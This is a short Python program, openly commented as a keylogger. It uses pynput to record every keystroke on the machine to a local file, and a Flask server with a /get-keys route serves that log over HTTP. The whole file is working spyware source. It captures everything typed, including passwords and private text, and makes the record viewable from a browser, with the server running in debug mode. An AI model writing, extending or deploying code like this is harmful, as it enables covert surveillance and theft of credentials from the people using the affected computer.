from flask import Flask, render_template
from pynput import keyboard

app = Flask(__name__)

# Keylogger functions
def keypressed(key):
    with open("keyfile1.txt", 'a') as logkey:
        try:
            char = key.char
            if char:
                logkey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.enter:
                logkey.write('\n')
            elif key == keyboard.Key.tab:
                logkey.write('\t')
            else:
                logkey.write('[' + str(key) + ']')

def keyreleased(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Run the keylogger listener when starting the server
def start_keylogger():
    listener = keyboard.Listener(on_press=keypressed, on_release=keyreleased)
    listener.start()

# Define the Flask route to serve the HTML page
@app.route('/')
def home():
    return render_template('index.html')  # Serves your HTML file

@app.route('/get-keys')
def get_keys():
    try:
        with open("keyfile1.txt", 'r') as logkey:
            data = logkey.read()
        return data.replace('\n', '<br>')  # Convert newlines to <br> for HTML display
    except FileNotFoundError:
        return "No keys logged yet."

if __name__ == "__main__":
    start_keylogger()  # Start the keylogger
    app.run(debug=True, port=5001)  # Start the Flask web server on port 5001